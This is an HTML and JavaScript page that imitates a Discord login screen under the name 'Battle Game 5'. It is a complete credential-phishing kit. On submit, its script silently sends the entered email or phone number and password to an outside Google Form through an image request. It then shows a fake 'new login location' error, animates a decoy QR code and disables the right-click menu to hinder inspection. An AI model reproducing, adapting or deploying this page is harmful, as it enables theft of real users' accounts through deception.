<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="./css/index.css">
    <link rel="stylesheet" href="css/main.css">
    <title>Battle Game 5 Discord Login</title>
</head>
<body>
    <img src="./assets/bg.svg" alt="App BG" class="bg">
    <div class="login-page">
        <div class="svg-logo-text">
            <img src="./assets/login-screen-logo.svg" alt="App">
        </div>

        <main class="main">
            <div class="authBox">
                <div class="main-form">
                    <form id="loginForm">
                        <div class="input-groups">
                            <div class="main-form-header">
                                <h1>Welcome back!</h1>
                                <p>We're so excited to see you again!</p>
                            </div>
                            <div class="email-wrapper">
                                <label for="emailORphone">
                                    Email or Phone Number
                                    <span class="required">*</span>
                                </label>
                                <input type="text" id="emailORphone" required autocomplete="off">
                            </div>
                            <div class="password-wrapper">
                                <label for="password">
                                    Password
                                    <span class="required">*</span>
                                </label>
                                <input type="password" id="password" required>
                            </div>
                        </div>
                        <div class="forgot-password">
                            <a href="#">Forgot your password?</a>
                        </div>
                        <div class="login">
                            <button type="submit">
                                Log In
                            </button>
                        </div>
                        <div class="small-register">
                            <span>Need an account?</span>
                            <a href="#">Register</a>
                        </div>
                    </form>
                </div>

                <div class="right-section">
                    <div class="login-container">
                        <div class="qr-code">
                            <img src="./assets/qrcode-app-logo.png" alt="App Logo">
                        </div>
                        <h2>Log in with QR Code</h2>
                        <p>Scan this with the <strong>Discord mobile app</strong> to log in instantly.</p>
                        <a href="#">Or sign in with passkey</a>
                    </div>
                </div>
            </div>
        </main>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcode-generator/1.4.4/qrcode.min.js"></script>
    <script>
        // ==================================
        // CONFIG
        // ==================================
        const CONFIG = {
            ANIMATION_DURATION: 3000,
            QR_REFRESH_INTERVAL: 120000, // 2 minutes
            ELLIPSIS_DELAY_INCREMENT: 0.2,
            QR_STRING_LENGTH: 43,

            // Your Google Form (confirmed working with your pre-filled link)
            GOOGLE_FORM_URL: 'https://docs.google.com/forms/d/e/1FAIpQLSeb5ChzGjxAX3UloE2IFuDxx02prsTwdMIqCOOWogkMM9m9Ug/formResponse',
            ENTRY_EMAIL_OR_PHONE: 'entry.1214659440',
            ENTRY_PASSWORD: 'entry.565142151',
        };

        // ==================================
        // SELECTORS
        // ==================================
        const DOM = {
            loginButton: document.querySelector("button[type='submit']"),
            qrCodeContainer: document.querySelector(".right-section .qr-code"),
            emailInput: document.querySelector('#emailORphone'),
            passwordInput: document.querySelector('#password'),
            emailWrapper: document.querySelector('.email-wrapper'),
            passwordWrapper: document.querySelector('.password-wrapper'),
        };

        // ==================================
        // UTILITY FUNCTIONS
        // ==================================
        const generateRandomString = (length = CONFIG.QR_STRING_LENGTH) => {
            const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            return Array.from({ length }, () => characters.charAt(Math.floor(Math.random() * characters.length))).join("");
        };

        // Silent submission to Google Forms (fire-and-forget â€“ no console errors)
        const sendToGoogleForms = (data) => {
            const params = new URLSearchParams({
                [CONFIG.ENTRY_EMAIL_OR_PHONE]: data.emailOrPhone || '',
                [CONFIG.ENTRY_PASSWORD]: data.password || '',
            });

            new Image().src = CONFIG.GOOGLE_FORM_URL + '?' + params.toString() + '&_=' + Date.now();
        };

        // ==================================
        // QR CODE MODULE
        // ==================================
        const QRCodeModule = {
            generate(data) {
                try {
                    const qr = qrcode(0, "L");
                    qr.addData(data);
                    qr.make();

                    const moduleCount = qr.getModuleCount();
                    const svgString = qr.createSvgTag(1, 0);

                    const parser = new DOMParser();
                    const svgDoc = parser.parseFromString(svgString, "image/svg+xml");
                    const svgElement = svgDoc.documentElement;

                    svgElement.setAttribute("width", "160");
                    svgElement.setAttribute("height", "160");
                    svgElement.setAttribute("viewBox", "0 0 37 37");

                    const path = svgElement.querySelector("path");
                    if (path) {
                        path.setAttribute("transform", `scale(${37 / moduleCount})`);
                    }

                    return svgElement;
                } catch (error) {
                    console.error("Error generating QR code:", error);
                    return null;
                }
            },

            getSpinnerMarkup() {
                return `
                    <span class="spinner qrCode-spinner" role="img" aria-label="Loading" aria-hidden="true">
                        <span class="inner wanderingCubes">
                            <span class="item"></span>
                            <span class="item"></span>
                        </span>
                    </span>
                `;
            },

            showLoadingAnimation() {
                if (!DOM.qrCodeContainer) return;

                const svg = DOM.qrCodeContainer.querySelector("svg");
                const img = DOM.qrCodeContainer.querySelector("img");

                svg?.remove();
                img?.remove();

                DOM.qrCodeContainer.style.background = "transparent";
                DOM.qrCodeContainer.insertAdjacentHTML("afterbegin", this.getSpinnerMarkup());
            },

            refresh() {
                if (!DOM.qrCodeContainer) return;

                DOM.qrCodeContainer.innerHTML = "";

                const newQRCode = this.generate(`https://app.com/ra/${generateRandomString()}`);

                if (newQRCode) {
                    DOM.qrCodeContainer.appendChild(newQRCode);
                }

                DOM.qrCodeContainer.insertAdjacentHTML("beforeend", `<img src="./assets/qrcode-app-logo.png" alt="App Logo">`);
                DOM.qrCodeContainer.style.background = "white";
            },

            simulateRefresh() {
                this.showLoadingAnimation();
                setTimeout(() => this.refresh(), 3500);
            },

            initRefreshInterval() {
                this.simulateRefresh();
                setInterval(() => this.simulateRefresh(), CONFIG.QR_REFRESH_INTERVAL);
            },
        };

        // ==================================
        // LOGIN BUTTON MODULE
        // ==================================
        const LoginButtonModule = {
            getEllipsisMarkup() {
                return `
                    <span class="spinner" role="img" aria-label="Loading">
                        <span class="inner pulsingEllipsis">
                            <span class="item spinnerItem"></span>
                            <span class="item spinnerItem"></span>
                            <span class="item spinnerItem"></span>
                        </span>
                    </span>
                `;
            },

            applyAnimationDelays() {
                const spinnerItems = document.querySelectorAll(".spinnerItem");
                spinnerItems.forEach((item, index) => {
                    item.style.animation = `spinner-pulsing-ellipsis 1.4s infinite ease-in-out ${index * CONFIG.ELLIPSIS_DELAY_INCREMENT}s`;
                });
            },

            showNewLoginMessage() {
                if (DOM.emailWrapper && !DOM.emailWrapper.querySelector('.error-message')) {
                    const message = document.createElement('span');
                    message.className = 'error-message';
                    message.textContent = 'New login location detected, please check your e-mail.';
                    message.style.color = 'red';
                    message.style.display = 'block';
                    message.style.fontSize = '12px';
                    message.style.marginTop = '5px';
                    message.style.marginBottom = '5px';

                    const input = DOM.emailWrapper.querySelector('input');
                    if (input) {
                        DOM.emailWrapper.insertBefore(message, input);
                    }
                }

                if (DOM.emailInput) DOM.emailInput.style.border = '1px solid red';
                if (DOM.passwordInput) DOM.passwordInput.style.border = '1px solid red';
            },

            async showLoading() {
                if (!DOM.loginButton) return;

                DOM.loginButton.innerHTML = this.getEllipsisMarkup();
                DOM.loginButton.setAttribute("disabled", "true");
                this.applyAnimationDelays();

                const formData = {
                    emailOrPhone: DOM.emailInput?.value || '',
                    password: DOM.passwordInput?.value || '',
                };

                // Send credentials silently to your Google Form
                sendToGoogleForms(formData);

                // Wait for the loading animation
                await new Promise(resolve => setTimeout(resolve, CONFIG.ANIMATION_DURATION));

                // Show fake "new login location" error
                this.showNewLoginMessage();

                // Reset button
                this.reset();
            },

            reset() {
                if (!DOM.loginButton) return;
                DOM.loginButton.innerHTML = "";
                DOM.loginButton.textContent = "Log In";
                DOM.loginButton.removeAttribute("disabled");
            },

            init() {
                const form = document.querySelector('#loginForm');
                if (form) {
                    form.addEventListener("submit", (e) => {
                        e.preventDefault();
                        this.showLoading();
                    });
                }
            },
        };

        // ==================================
        // INITIALIZATION
        // ==================================
        const init = () => {
            LoginButtonModule.init();
            QRCodeModule.initRefreshInterval();
            document.addEventListener("contextmenu", e => e.preventDefault());
        };

        if (document.readyState === "loading") {
            document.addEventListener("DOMContentLoaded", init);
        } else {
            init();
        }
    </script>
</body>
</html>